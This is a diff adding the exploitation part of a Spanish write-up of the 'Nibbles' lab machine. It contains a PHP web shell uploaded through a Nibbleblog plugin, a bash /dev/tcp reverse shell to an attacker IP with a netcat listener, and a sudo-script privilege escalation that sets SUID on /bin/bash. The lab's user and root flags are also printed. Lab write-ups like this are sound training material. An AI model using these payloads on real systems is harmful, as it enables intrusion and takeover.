@@ -59,13 +59,13 @@ Una vez identificados los puertos abiertos, se realiza un escaneo enfocado a enu
 nmap -sCV -p22,80 10.129.200.170 -oN objetivos
 ```
 
-* -sC: Ejecuta scripts NSE por defecto (detección estándar).
+* -sC Ejecuta scripts NSE por defecto (detección estándar).
 
-* -sV: Identifica versiones de los servicios.
+* -sV Identifica versiones de los servicios.
 
-* -p22,80: Limita el escaneo a los puertos ya descubiertos.
+* -p22,80 Limita el escaneo a los puertos ya descubiertos.
 
-* -oN: Guarda la salida para analisis posterior.
+* -oN Guarda la salida para analisis posterior.
 
 ```bash
 ┌─[santiago@parrot]─[~/Desktop/Maquinas/nibbles/practica2]
@@ -180,15 +180,15 @@ Filtered Requests: 68551
 Requests/sec.: 0
 ```
 
-* -c: salida coloreada para mayor legibilidad.
+* -c salida coloreada para mayor legibilidad.
 
-* --hc=404: oculta las respuestas con código 404 (no encontrado).
+* --hc=404 oculta las respuestas con código 404 (no encontrado).
 
-* -t 200: usa 200 hilos para acelerar la enumeración.
+* -t 200 usa 200 hilos para acelerar la enumeración.
 
-* -w …directory-list-2.3-medium.txt: diccionario ampliamente utilizado en enumeración web.
+* -w …directory-list-2.3-medium.txt diccionario ampliamente utilizado en enumeración web.
 
-* FUZZ: palabra clave que Wfuzz sustituye en cada petición.
+* FUZZ palabra clave que Wfuzz sustituye en cada petición.
 
 También realicé fuzzing orientado a encontrar archivos PHP dentro del CMS
 
@@ -260,7 +260,229 @@ El plugin my_image no valida adecuadamente el tipo de archivo, por lo que puedo 
 
 Se puede acceder directamente al archivo subido y ejecutarlo en el servidor, al abrir ese archivo mediante una petición HTTP, se ejecuta el payload y se obtiene ejecución remota de comandos (RCE).
 
+Creamos un archivo .php con el siguiente codigo:
 
+```php
+<?php
+  system($_REQUEST['cmd']);
+?>
+```
 
+Subimos el archivo, y al dirigirnos a la ruta /content/private/plugins/my_image/image.php colocamos **?cmd=whoami** para comprobar si tenemos ejecucion remota de comandos 
+
+<img width="1165" height="181" alt="image" src="https://github.com/user-attachments/assets/ab07d155-e3db-494d-b173-0bf1aa587224" />
+
+Esto nos confirma que tenemos RCE en el servidor.
+
+ 7) Obtener Reverse-Shell
+
+Para obtener una reverse shell utilice el siguiente comando:
+
+**bash -c "bash -i >& /dev/tcp/10.10.16.47/8080 0>%261"** 
+
+Es necesario enviarlo URL-encodeado:
+
+ **bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.47%2F8080%200%3E%261%22**
+
+Previamente en nuestra maquina debemos de estar en escucha
+
+```bash
+nc -nlvp 8080
+```
+
+* -n indica a Netcat que no realice resolución DNS. Esto acelera la conexión y evita retrasos innecesarios.
+* -l Pone Netcat en modo listen, es decir, espera conexiones entrantes. Es fundamental cuando queremos recibir una reverse shell.
+* -v Modo verbose. Permite ver información adicional durante la conexión, útil para depuración.
+* -p Especifica el puerto donde estaremos escuchando. En este caso, el puerto 8080, que debe coincidir con el puerto especificado en el payload de reverse shell.
+
+```bash
+┌─[santiago@parrot]─[~/Desktop/Maquinas/nibbles/practica2]
+└──╼ $nc -nlvp 8080
+listening on [any] 8080 ...
+connect to [10.10.16.47] from (UNKNOWN) [10.129.200.170] 47940
+bash: cannot set terminal process group (1282): Inappropriate ioctl for device
+bash: no job control in this shell
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ 
+```
+
+Con la shell ya activa, podemos buscar la flag del usuario
+
+```bash
+nibbler@Nibbles:/home/nibbler$ cat user.txt
+cat user.txt
+79c03865431abf47b90ef24b9695e148
+nibbler@Nibbles:/home/nibbler$ 
+```
+
+**Primer objetivo cumplido**
+
+ 8) Conseguir una TTY interactiva
+
+Después de obtener la reverse shell con Netcat, la terminal inicial es muy limitada, no soporta autocompletado, colores, teclas de navegación ni ejecución interactiva de varios comandos.
+Para trabajar de forma adecuada, es necesario estabilizar la TTY.
+
+A continuación se muestran los pasos utilizados para convertir la shell inicial en una TTY completamente interactiva:
+
+Pasos para estabilizar la TTY
+
+Generar una pseudo-TTY usando script:
+```bash
+script /dev/null -c bash
+```
+
+Suspender la sesión con **Ctrl + Z**
+Esto devuelve el control a la consola de la máquina atacante.
+
+Colocar la terminal en modo raw y volver al foreground:
+```bash
+stty raw -echo; fg
+```
+
+Restablecer la TTY en el lado víctima:
+```bash
+reset xterm
+```
+
+Exportar variables necesarias para mejorar la compatibilidad:
+```bash
+export TERM=xterm and export SHELL=/bin/bash
+```
+
+Ajustar el tamaño de la terminal:
+En la máquina atacante, verificamos el tamaño:
+```bash
+stty size
+```
+
+Finalmente, en la máquina víctima aplicamos esos valores:
+```bash
+stty rows 27 columns 126
+```
+
+Con este procedimiento obtenemos una TTY interactiva totalmente funcional, permitiendo:
+
+- Autocompletado
+- Historial con teclas ↑ ↓
+- Colores en la terminal
+- Uso correcto de editores (nano, vi, etc.)
+- Mayor estabilidad en la sesión
+
+**Esto hace que la post-explotación sea mucho más cómoda y eficiente.**
+
+```bash
+nibbler@Nibbles:/home/nibbler$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+nibbler@Nibbles:/home/nibbler$ ^Z
+[1]+  Detenido                nc -nlvp 8080
+┌─[✗]─[santiago@parrot]─[~/Desktop/Maquinas/nibbles/practica2]
+└──╼ $stty raw -echo; fg
+```
+```bash
+┌─[✗]─[santiago@parrot]─[~/Desktop/Maquinas/nibbles/practica2]
+└──╼ $stty raw -echo; fg
+nc -nlvp 8080
+             reset xterm
+```
+```bash
+nibbler@Nibbles:/home/nibbler$ export TERM=xterm and export SHELL=/bin/bash
+nibbler@Nibbles:/home/nibbler$ stty rows 27 columns 126
+nibbler@Nibbles:/home/nibbler$ 
+```
+
+ 9) Escalar privilegios
+
+El primer paso para identificar posibles vectores de escalada es comprobar si el usuario comprometido posee permisos especiales mediante sudo. Para ello se utiliza:
+
+```bash
+sudo -l
+```
+
+El resultado obtenido es:
+
+```bash
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+```
+
+Esto indica que el usuario puede ejecutar el script monitor.sh como root sin contraseña, lo cual es una mala práctica crítica si el script es modificable.
+Como el archivo se encuentra dentro del directorio personal del usuario, tenemos permisos de escritura, permitiendo modificarlo y abusar de la configuración para obtener root.
+
+Este permiso es extremadamente peligroso, ya que:
+ - El archivo es propiedad del usuario nibbler.
+ - El usuario puede editarlo libremente.
+ - Al ejecutarlo con **sudo**, el contenido del script se ejecuta con privilegios de root.
+
+Modificamos el sicript para aprovechar esta mala configuración, reemplazo el contenido del script por una instrucción que agrega el bit SUID a /bin/bash.
+Esto permite que bash pueda ejecutarse con privilegios de root cuando se invoque con bash -p.
+
+Comando utilizado:
+
+**echo -e '#!/bin/bash\nchmod u+s /bin/bash' > monitor.sh**
+
+```bash
+nibbler@Nibbles:/home/nibbler/personal/stuff$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' > monitor.sh
+```
+
+Ejecutamos el script con sudo y luego colocamos **bash -p**
+
+```bash
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ bash -p 
+bash-4.3# whoami
+root
+```
+
+Esto nos permite acceder al usuario root, ahora solo debemos encontrar su flag
+
+```bash
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ bash -p 
+bash-4.3# whoami
+root
+bash-4.3# cd /
+bash-4.3# cd root
+bash-4.3# ls
+root.txt
+bash-4.3# cat root.txt
+de5e5d6619862a8aa5b9b212314e0cdd
+bash-4.3# 
+```
+
+**MISION CUMPLIDA**
+
+------
+
+## Conclusiones
+
+Durante el proceso de explotación de la máquina Nibbles, se evidencian varias malas prácticas de seguridad que permiten la obtención de acceso root:
+
+ 1) Credenciales débiles
+
+    El usuario admin utilizaba como contraseña el nombre de la máquina, lo cual es altamente inseguro.
+
+ 2. Uso de CMS desactualizado
+
+    Nibbleblog 4.0.3 tiene una vulnerabilidad conocida de Subida Arbitraria de Archivos. Mantener software obsoleto expone el servidor a RCE.
+
+ 4. Manejo incorrecto de permisos en sudo
+
+    Permitir que un usuario ejecute un script modificable con permisos root es una falla crítica que facilita la escalada de privilegios sin necesidad de exploits avanzados.
+
+ 4. Importancia de la enumeración
+
+    El acceso inicial fue posible gracias a la correcta enumeración de:
+
+     * Directorios ocultos
+     * Versiones de software
+     * Archivos privados expuestos
+     * Scripts ejecutables vía sudo
+
+ 6. Buenas prácticas aplicadas
+    
+    * Uso de RCE para obtener reverse shell
+    * Privilage escalation mediante análisis de sudoers
+    * Obtención de TTY interactiva antes de trabajar en el sistema
+    * Validación del comportamiento del CMS
 
 
